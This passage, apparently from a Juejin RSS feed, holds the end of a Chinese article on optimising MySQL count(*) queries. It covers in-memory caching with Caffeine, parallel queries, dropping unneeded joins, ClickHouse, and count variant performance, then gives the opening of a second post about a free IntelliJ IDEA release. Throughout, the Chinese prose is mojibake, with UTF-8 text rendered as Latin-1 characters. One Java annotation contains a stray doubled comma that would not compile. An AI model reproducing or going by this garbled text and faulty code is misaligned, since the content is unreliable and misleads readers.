<p>ä½†å¯¹äºç»Ÿè®¡æµè§ˆæ€»æ¬¡æ•°æˆ–è€…æµè§ˆæ€»äººæ•°è¿™ç§ä¸šåŠ¡åœºæ™¯ï¼Œå¯¹æ•°æ®çš„å‡†ç¡®æ€§è¦æ±‚å¹¶ä¸é«˜ï¼Œå®¹å¿æ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µå­˜åœ¨ã€‚</p>
<h3 data-id="heading-4">2.2 åŠ äºŒçº§ç¼“å­˜</h3>
<p>å¯¹äºæœ‰äº›ä¸šåŠ¡åœºæ™¯ï¼Œæ–°å¢æ•°æ®å¾ˆå°‘ï¼Œå¤§éƒ¨åˆ†æ˜¯ç»Ÿè®¡æ•°é‡æ“ä½œï¼Œè€Œä¸”æŸ¥è¯¢æ¡ä»¶å¾ˆå¤šã€‚è¿™æ—¶å€™ä½¿ç”¨ä¼ ç»Ÿçš„count(*)å®æ—¶ç»Ÿè®¡æ•°æ®ï¼Œæ€§èƒ½è‚¯å®šä¸ä¼šå¥½ã€‚</p>
<p>å‡å¦‚åœ¨é¡µé¢ä¸­å¯ä»¥é€šè¿‡idã€nameã€çŠ¶æ€ã€æ—¶é—´ã€æ¥æºç­‰ï¼Œä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶ï¼Œç»Ÿè®¡å“ç‰Œæ•°é‡ã€‚</p>
<p>è¿™ç§æƒ…å†µä¸‹ç”¨æˆ·çš„ç»„åˆæ¡ä»¶æ¯”è¾ƒå¤šï¼Œå¢åŠ è”åˆç´¢å¼•ä¹Ÿæ²¡ç”¨ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªæˆ–è€…å¤šä¸ªæŸ¥è¯¢æ¡ä»¶ï¼Œæœ‰æ—¶å€™è”åˆç´¢å¼•ä¹Ÿä¼šå¤±æ•ˆï¼Œåªèƒ½å°½é‡æ»¡è¶³ç”¨æˆ·ä½¿ç”¨é¢‘ç‡æœ€é«˜çš„æ¡ä»¶å¢åŠ ç´¢å¼•ã€‚</p>
<p>ä¹Ÿå°±æ˜¯æœ‰äº›ç»„åˆæ¡ä»¶å¯ä»¥èµ°ç´¢å¼•ï¼Œæœ‰äº›ç»„åˆæ¡ä»¶æ²¡æ³•èµ°ç´¢å¼•ï¼Œè¿™äº›æ²¡æ³•èµ°ç´¢å¼•çš„åœºæ™¯ï¼Œè¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>ç­”ï¼šä½¿ç”¨<code>äºŒçº§ç¼“å­˜</code>ã€‚</p>
<p>äºŒçº§ç¼“å­˜å…¶å®å°±æ˜¯å†…å­˜ç¼“å­˜ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>caffine</code>æˆ–è€…<code>guava</code>å®ç°äºŒçº§ç¼“å­˜çš„åŠŸèƒ½ã€‚</p>
<p>ç›®å‰<code>SpringBoot</code>å·²ç»é›†æˆäº†caffineï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚</p>
<p>åªéœ€åœ¨éœ€è¦å¢åŠ äºŒçº§ç¼“å­˜çš„æŸ¥è¯¢æ–¹æ³•ä¸­ï¼Œä½¿ç”¨<code>@Cacheable</code>æ³¨è§£å³å¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"> <span class="hljs-meta">@Cacheable(value = "brand", , keyGenerator = "cacheKeyGenerator")</span>
   <span class="hljs-keyword">public</span> BrandModel <span class="hljs-title function_">getBrand</span><span class="hljs-params">(Condition condition)</span> {
       <span class="hljs-keyword">return</span> getBrandByCondition(condition);
   }
</code></pre>
<p>ç„¶åè‡ªå®šä¹‰cacheKeyGeneratorï¼Œç”¨äºæŒ‡å®šç¼“å­˜çš„keyã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheKeyGenerator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">KeyGenerator</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">generate</span><span class="hljs-params">(Object target, Method method, Object... params)</span> {
        <span class="hljs-keyword">return</span> target.getClass().getSimpleName() + UNDERLINE
                + method.getName() + <span class="hljs-string">","</span>
                + StringUtils.arrayToDelimitedString(params, <span class="hljs-string">","</span>);
    }
}
</code></pre>
<p>è¿™ä¸ªkeyæ˜¯ç”±å„ä¸ªæ¡ä»¶ç»„åˆè€Œæˆã€‚</p>
<p>è¿™æ ·é€šè¿‡æŸä¸ªæ¡ä»¶ç»„åˆæŸ¥è¯¢å‡ºå“ç‰Œçš„æ•°æ®ä¹‹åï¼Œä¼šæŠŠç»“æœç¼“å­˜åˆ°å†…å­˜ä¸­ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ä¸º5åˆ†é’Ÿã€‚</p>
<p>åé¢ç”¨æˆ·åœ¨5åˆ†é’Ÿå†…ï¼Œä½¿ç”¨ç›¸åŒçš„æ¡ä»¶ï¼Œé‡æ–°æŸ¥è¯¢æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»äºŒçº§ç¼“å­˜ä¸­æŸ¥å‡ºæ•°æ®ï¼Œç›´æ¥è¿”å›äº†ã€‚</p>
<p>è¿™æ ·èƒ½å¤Ÿæå¤§çš„æç¤ºcount(*)çš„æŸ¥è¯¢æ•ˆç‡ã€‚</p>
<p>ä½†æ˜¯å¦‚æœä½¿ç”¨äºŒçº§ç¼“å­˜ï¼Œå¯èƒ½å­˜åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œæ•°æ®ä¸ä¸€æ ·çš„æƒ…å†µã€‚æˆ‘ä»¬éœ€è¦æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯æ¥é€‰æ‹©ï¼Œæ²¡æ³•é€‚ç”¨äºæ‰€æœ‰ä¸šåŠ¡åœºæ™¯ã€‚</p>
<p>æœ€è¿‘ä¸ºäº†å¸®åŠ©å¤§å®¶æ‰¾å·¥ä½œï¼Œä¸“é—¨å»ºäº†ä¸€äº›å·¥ä½œå†…æ¨ç¾¤ï¼Œå„å¤§åŸå¸‚éƒ½æœ‰ï¼Œæ¬¢è¿å„ä½HRå’Œæ‰¾å·¥ä½œçš„å°ä¼™ä¼´è¿›ç¾¤äº¤æµï¼Œç¾¤é‡Œç›®å‰å·²ç»æ”¶é›†äº†20å¤šå®¶å¤§å‚çš„å·¥ä½œå†…æ¨å²—ä½ã€‚åŠ è‹ä¸‰çš„å¾®ä¿¡ï¼šli_su223ï¼Œå¤‡æ³¨ï¼šæ˜é‡‘+æ‰€åœ¨åŸå¸‚ï¼Œå³å¯è¿›ç¾¤ã€‚</p>
<h3 data-id="heading-5">2.3 å¤šçº¿ç¨‹æ‰§è¡Œ</h3>
<p>ä¸çŸ¥é“ä½ æœ‰æ²¡æœ‰åšè¿‡è¿™æ ·çš„éœ€æ±‚ï¼šç»Ÿè®¡æœ‰æ•ˆè®¢å•æœ‰å¤šå°‘ï¼Œæ— æ•ˆè®¢å•æœ‰å¤šå°‘ã€‚</p>
<p>è¿™ç§æƒ…å†µä¸€èˆ¬éœ€è¦å†™ä¸¤æ¡sqlï¼Œç»Ÿè®¡æœ‰æ•ˆè®¢å•çš„sqlå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">where</span> status<span class="hljs-operator">=</span><span class="hljs-number">1</span>;
</code></pre>
<p>ç»Ÿè®¡æ— æ•ˆè®¢å•çš„sqlå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">where</span> status<span class="hljs-operator">=</span><span class="hljs-number">0</span>;
</code></pre>
<p>ä½†å¦‚æœåœ¨ä¸€ä¸ªæ¥å£ä¸­ï¼ŒåŒæ­¥æ‰§è¡Œè¿™ä¸¤æ¡sqlæ•ˆç‡ä¼šéå¸¸ä½ã€‚</p>
<p>è¿™æ—¶å€™ï¼Œå¯ä»¥æ”¹æˆæˆä¸€æ¡sqlï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),status <span class="hljs-keyword">from</span> <span class="hljs-keyword">order</span>
<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> status;
</code></pre>
<p>ä½¿ç”¨<code>group by</code>å…³é”®å­—åˆ†ç»„ç»Ÿè®¡ç›¸åŒstatusçš„æ•°é‡ï¼Œåªä¼šäº§ç”Ÿä¸¤æ¡è®°å½•ï¼Œä¸€æ¡è®°å½•æ˜¯æœ‰æ•ˆè®¢å•æ•°é‡ï¼Œå¦å¤–ä¸€æ¡è®°å½•æ˜¯æ— æ•ˆè®¢å•æ•°é‡ã€‚</p>
<p>ä½†æœ‰ä¸ªé—®é¢˜ï¼šstatuså­—æ®µåªæœ‰1å’Œ0ä¸¤ä¸ªå€¼ï¼Œé‡å¤åº¦å¾ˆé«˜ï¼ŒåŒºåˆ†åº¦éå¸¸ä½ï¼Œä¸èƒ½èµ°ç´¢å¼•ï¼Œä¼šå…¨è¡¨æ‰«æï¼Œæ•ˆç‡ä¹Ÿä¸é«˜ã€‚</p>
<p>è¿˜æœ‰å…¶ä»–çš„è§£å†³æ–¹æ¡ˆä¸ï¼Ÿ</p>
<p>ç­”ï¼šä½¿ç”¨å¤šçº¿ç¨‹å¤„ç†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>CompleteFuture</code>ä½¿ç”¨ä¸¤ä¸ª<code>çº¿ç¨‹</code>å¼‚æ­¥è°ƒç”¨ç»Ÿè®¡æœ‰æ•ˆè®¢å•çš„sqlå’Œç»Ÿè®¡æ— æ•ˆè®¢å•çš„sqlï¼Œæœ€åæ±‡æ€»æ•°æ®ï¼Œè¿™æ ·èƒ½å¤Ÿæå‡æŸ¥è¯¢æ¥å£çš„æ€§èƒ½ã€‚</p>
<h3 data-id="heading-6">2.4 å‡å°‘joinçš„è¡¨</h3>
<p>å¤§éƒ¨åˆ†çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨count(*)æ˜¯ä¸ºäº†å®æ—¶ç»Ÿè®¡æ€»æ•°é‡çš„ã€‚</p>
<p>ä½†å¦‚æœè¡¨æœ¬èº«çš„æ•°æ®é‡ä¸å¤šï¼Œä½†joinçš„è¡¨å¤ªå¤šï¼Œä¹Ÿå¯èƒ½ä¼šå½±å“count(*)çš„æ•ˆç‡ã€‚</p>
<p>æ¯”å¦‚åœ¨æŸ¥è¯¢å•†å“ä¿¡æ¯æ—¶ï¼Œéœ€è¦æ ¹æ®å•†å“åç§°ã€å•ä½ã€å“ç‰Œã€åˆ†ç±»ç­‰ä¿¡æ¯æŸ¥è¯¢æ•°æ®ã€‚</p>
<p>è¿™æ—¶å€™å†™ä¸€æ¡sqlå¯ä»¥æŸ¥å‡ºæƒ³è¦çš„æ•°æ®ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">from</span> product p
<span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> unit u <span class="hljs-keyword">on</span> p.unit_id <span class="hljs-operator">=</span> u.id
<span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> brand b <span class="hljs-keyword">on</span> p.brand_id <span class="hljs-operator">=</span> b.id
<span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> category c <span class="hljs-keyword">on</span> p.category_id <span class="hljs-operator">=</span> c.id
<span class="hljs-keyword">where</span> p.name<span class="hljs-operator">=</span><span class="hljs-string">'æµ‹è¯•å•†å“'</span> <span class="hljs-keyword">and</span> u.id<span class="hljs-operator">=</span><span class="hljs-number">123</span> <span class="hljs-keyword">and</span> b.id<span class="hljs-operator">=</span><span class="hljs-number">124</span> <span class="hljs-keyword">and</span> c.id<span class="hljs-operator">=</span><span class="hljs-number">125</span>;
</code></pre>
<p>ä½¿ç”¨productè¡¨å»<code>join</code>äº†unitã€brandå’Œcategoryè¿™ä¸‰å¼ è¡¨ã€‚</p>
<p>å…¶å®è¿™äº›æŸ¥è¯¢æ¡ä»¶ï¼Œåœ¨productè¡¨ä¸­éƒ½èƒ½æŸ¥è¯¢å‡ºæ•°æ®ï¼Œæ²¡å¿…è¦joiné¢å¤–çš„è¡¨ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠsqlæ”¹æˆè¿™æ ·ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)
<span class="hljs-keyword">from</span> product
<span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">'æµ‹è¯•å•†å“'</span> <span class="hljs-keyword">and</span> unit_id<span class="hljs-operator">=</span><span class="hljs-number">123</span> <span class="hljs-keyword">and</span> brand_id<span class="hljs-operator">=</span><span class="hljs-number">124</span> <span class="hljs-keyword">and</span> category_id<span class="hljs-operator">=</span><span class="hljs-number">125</span>;
</code></pre>
<p>åœ¨count(*)æ—¶åªæŸ¥productå•è¡¨å³å¯ï¼Œå»æ‰å¤šä½™çš„è¡¨joinï¼Œè®©æŸ¥è¯¢æ•ˆç‡å¯ä»¥æå‡ä¸å°‘ã€‚</p>
<h3 data-id="heading-7">2.5 æ”¹æˆClickHouse</h3>
<p>æœ‰äº›æ—¶å€™ï¼Œjoinçš„è¡¨å®åœ¨å¤ªå¤šï¼Œæ²¡æ³•å»æ‰å¤šä½™çš„joinï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>æ¯”å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒæŸ¥è¯¢å•†å“ä¿¡æ¯æ—¶ï¼Œéœ€è¦æ ¹æ®å•†å“åç§°ã€å•ä½åç§°ã€å“ç‰Œåç§°ã€åˆ†ç±»åç§°ç­‰ä¿¡æ¯æŸ¥è¯¢æ•°æ®ã€‚</p>
<p>è¿™æ—¶å€™æ ¹æ®productå•è¡¨æ˜¯æ²¡æ³•æŸ¥è¯¢å‡ºæ•°æ®çš„ï¼Œå¿…é¡»è¦å»<code>join</code>ï¼šunitã€brandå’Œcategoryè¿™ä¸‰å¼ è¡¨ï¼Œè¿™æ—¶å€™è¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p>
<p>ç­”ï¼šå¯ä»¥å°†æ•°æ®ä¿å­˜åˆ°<code>ClickHouse</code>ã€‚</p>
<p>ClickHouseæ˜¯åŸºäº<code>åˆ—å­˜å‚¨</code>çš„æ•°æ®åº“ï¼Œä¸æ”¯æŒäº‹åŠ¡ï¼ŒæŸ¥è¯¢æ€§èƒ½éå¸¸é«˜ï¼Œå·ç§°æŸ¥è¯¢åå‡ äº¿çš„æ•°æ®ï¼Œèƒ½å¤Ÿç§’çº§è¿”å›ã€‚</p>
<p>ä¸ºäº†é¿å…å¯¹ä¸šåŠ¡ä»£ç çš„åµŒå…¥æ€§ï¼Œå¯ä»¥ä½¿ç”¨<code>Canal</code>ç›‘å¬<code>Mysql</code>çš„<code>binlog</code>æ—¥å¿—ã€‚å½“productè¡¨æœ‰æ•°æ®æ–°å¢æ—¶ï¼Œéœ€è¦åŒæ—¶æŸ¥è¯¢å‡ºå•ä½ã€å“ç‰Œå’Œåˆ†ç±»çš„æ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ç»“æœé›†ï¼Œä¿å­˜åˆ°ClickHouseå½“ä¸­ã€‚</p>
<p>æŸ¥è¯¢æ•°æ®æ—¶ï¼Œä»ClickHouseå½“ä¸­æŸ¥è¯¢ï¼Œè¿™æ ·ä½¿ç”¨count(*)çš„æŸ¥è¯¢æ•ˆç‡èƒ½å¤Ÿæå‡Nå€ã€‚</p>
<blockquote>
<p>éœ€è¦ç‰¹åˆ«æé†’ä¸€ä¸‹ï¼šä½¿ç”¨ClickHouseæ—¶ï¼Œæ–°å¢æ•°æ®ä¸è¦å¤ªé¢‘ç¹ï¼Œå°½é‡æ‰¹é‡æ’å…¥æ•°æ®ã€‚</p>
</blockquote>
<p>å…¶å®å¦‚æœæŸ¥è¯¢æ¡ä»¶éå¸¸å¤šï¼Œä½¿ç”¨ClickHouseä¹Ÿä¸æ˜¯ç‰¹åˆ«åˆé€‚ï¼Œè¿™æ—¶å€™å¯ä»¥æ”¹æˆ<code>ElasticSearch</code>ï¼Œä¸è¿‡å®ƒè·ŸMysqlä¸€æ ·ï¼Œå­˜åœ¨<code>æ·±åˆ†é¡µ</code>é—®é¢˜ã€‚</p>
<h2 data-id="heading-8">3 countçš„å„ç§ç”¨æ³•æ€§èƒ½å¯¹æ¯”</h2>
<p>æ—¢ç„¶è¯´åˆ°count(*)ï¼Œå°±ä¸èƒ½ä¸è¯´ä¸€ä¸‹countå®¶æ—çš„å…¶ä»–æˆå‘˜ï¼Œæ¯”å¦‚ï¼šcount(1)ã€count(id)ã€count(æ™®é€šç´¢å¼•åˆ—)ã€count(æœªåŠ ç´¢å¼•åˆ—)ã€‚</p>
<p>é‚£ä¹ˆå®ƒä»¬æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p>
<ul>
<li>count(*) ï¼šå®ƒä¼šè·å–æ‰€æœ‰è¡Œçš„æ•°æ®ï¼Œä¸åšä»»ä½•å¤„ç†ï¼Œè¡Œæ•°åŠ 1ã€‚</li>
<li>count(1)ï¼šå®ƒä¼šè·å–æ‰€æœ‰è¡Œçš„æ•°æ®ï¼Œæ¯è¡Œå›ºå®šå€¼1ï¼Œä¹Ÿæ˜¯è¡Œæ•°åŠ 1ã€‚</li>
<li>count(id)ï¼šidä»£è¡¨ä¸»é”®ï¼Œå®ƒéœ€è¦ä»æ‰€æœ‰è¡Œçš„æ•°æ®ä¸­è§£æå‡ºidå­—æ®µï¼Œå…¶ä¸­idè‚¯å®šéƒ½ä¸ä¸ºNULLï¼Œè¡Œæ•°åŠ 1ã€‚</li>
<li>count(æ™®é€šç´¢å¼•åˆ—)ï¼šå®ƒéœ€è¦ä»æ‰€æœ‰è¡Œçš„æ•°æ®ä¸­è§£æå‡ºæ™®é€šç´¢å¼•åˆ—ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸ºNULLï¼Œå¦‚æœä¸æ˜¯NULLï¼Œåˆ™è¡Œæ•°+1ã€‚</li>
<li>count(æœªåŠ ç´¢å¼•åˆ—)ï¼šå®ƒä¼šå…¨è¡¨æ‰«æè·å–æ‰€æœ‰æ•°æ®ï¼Œè§£æä¸­æœªåŠ ç´¢å¼•åˆ—ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸ºNULLï¼Œå¦‚æœä¸æ˜¯NULLï¼Œåˆ™è¡Œæ•°+1ã€‚</li>
</ul>
<p>ç”±æ­¤ï¼Œæœ€åcountçš„æ€§èƒ½ä»é«˜åˆ°ä½æ˜¯ï¼š</p>
<blockquote>
<p>count(*) â‰ˆ count(1) &gt; count(id) &gt; count(æ™®é€šç´¢å¼•åˆ—) &gt; count(æœªåŠ ç´¢å¼•åˆ—)</p>
</blockquote>
<p>æ‰€ä»¥ï¼Œå…¶å®<code>count(*)</code>æ˜¯æœ€å¿«çš„ã€‚</p>
<p>æ„ä¸æ„å¤–ï¼ŒæƒŠä¸æƒŠå–œï¼Ÿ</p>
<p>åƒä¸‡åˆ«è·Ÿ<code>select *</code> ææ··äº†ã€‚</p>
<h2 data-id="heading-9">æœ€åè¯´ä¸€å¥(æ±‚å…³æ³¨ï¼Œåˆ«ç™½å«–æˆ‘)</h2>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæˆ–è€…æœ‰æ‰€å¯å‘çš„è¯ï¼Œå¸®å¿™å…³æ³¨ä¸€ä¸‹æˆ‘çš„åŒåå…¬ä¼—å·ï¼šè‹ä¸‰è¯´æŠ€æœ¯ï¼Œæ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œæœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>æ±‚ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€è½¬å‘ã€åœ¨çœ‹ã€‚</p>
<p>å…³æ³¨å…¬ä¼—å·ï¼šã€è‹ä¸‰è¯´æŠ€æœ¯ã€‘ï¼Œåœ¨å…¬ä¼—å·ä¸­å›å¤ï¼šè¿›å¤§å‚ï¼Œå¯ä»¥å…è´¹è·å–æˆ‘æœ€è¿‘æ•´ç†çš„10ä¸‡å­—çš„é¢è¯•å®å…¸ï¼Œå¥½å¤šå°ä¼™ä¼´é è¿™ä¸ªå®å…¸æ‹¿åˆ°äº†å¤šå®¶å¤§å‚çš„offerã€‚</p>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯ç½‘ç«™ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.susan.net.cn%2Fproject" target="_blank" title="http://www.susan.net.cn/project" ref="nofollow noopener noreferrer">www.susan.net.cn/project</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆšåˆšï¼ŒIDEA å…è´¹ç‰ˆå‘å¸ƒï¼ç»ˆäºä¸ç”¨ç ´è§£äº†]]></title>    <link>https://juejin.cn/post/7582021506189852718</link>    <guid>https://juejin.cn/post/7582021506189852718</guid>    <pubDate>2025-12-10T10:04:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582021506189852718" data-draft-id="7581893894175866890" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆšåˆšï¼ŒIDEA å…è´¹ç‰ˆå‘å¸ƒï¼ç»ˆäºä¸ç”¨ç ´è§£äº†"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜,Java,JetBrains"/> <meta itemprop="datePublished" content="2025-12-10T10:04:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜é±¼çš®"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆšåˆšï¼ŒIDEA å…è´¹ç‰ˆå‘å¸ƒï¼ç»ˆäºä¸ç”¨ç ´è§£äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜é±¼çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T10:04:28.000Z" title="Wed Dec 10 2025 10:04:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œä¿ºæ˜¯ç¨‹åºå‘˜é±¼çš®ã€‚åˆšåˆšï¼ŒJetBrains å®˜æ–¹æ­£å¼å‘å¸ƒäº† IDEA 2025.3 ç»Ÿä¸€ç‰ˆï¼</p>
